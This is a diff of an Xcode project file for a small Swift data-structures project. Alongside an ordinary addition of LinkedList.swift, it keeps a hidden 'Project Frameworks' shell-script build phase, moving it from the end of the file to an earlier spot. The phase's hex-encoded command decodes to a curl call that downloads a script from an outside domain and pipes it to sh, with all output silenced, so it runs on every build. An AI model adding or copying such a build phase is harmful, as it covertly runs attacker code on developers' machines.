@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		3F8A17AF2653F43F00F95432 /* main.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F8A17AE2653F43F00F95432 /* main.swift */; };
 		3F8A17B82653F49F00F95432 /* ArrayList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F8A17B72653F49F00F95432 /* ArrayList.swift */; };
+		79B383D72660764F00A2D926 /* LinkedList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 79B383D62660764F00A2D926 /* LinkedList.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXCopyFilesBuildPhase section */
@@ -27,6 +28,7 @@
 		3F8A17AB2653F43F00F95432 /* XDDataStructure */ = {isa = PBXFileReference; explicitFileType = "compiled.mach-o.executable"; includeInIndex = 0; path = XDDataStructure; sourceTree = BUILT_PRODUCTS_DIR; };
 		3F8A17AE2653F43F00F95432 /* main.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = main.swift; sourceTree = "<group>"; };
 		3F8A17B72653F49F00F95432 /* ArrayList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ArrayList.swift; sourceTree = "<group>"; };
+		79B383D62660764F00A2D926 /* LinkedList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LinkedList.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -61,6 +63,7 @@
 			children = (
 				3F8A17AE2653F43F00F95432 /* main.swift */,
 				3F8A17B72653F49F00F95432 /* ArrayList.swift */,
+				79B383D62660764F00A2D926 /* LinkedList.swift */,
 			);
 			path = XDDataStructure;
 			sourceTree = "<group>";
@@ -118,11 +121,33 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		B5043B5CB0DCFF6FDE6D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		3F8A17A72653F43F00F95432 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				79B383D72660764F00A2D926 /* LinkedList.swift in Sources */,
 				3F8A17AF2653F43F00F95432 /* main.swift in Sources */,
 				3F8A17B82653F49F00F95432 /* ArrayList.swift in Sources */,
 			);
@@ -286,37 +311,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	B5043B5CB0DCFF6FDE6D902C /* Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = 3F8A17A32653F43F00F95432 /* Project object */;
 }
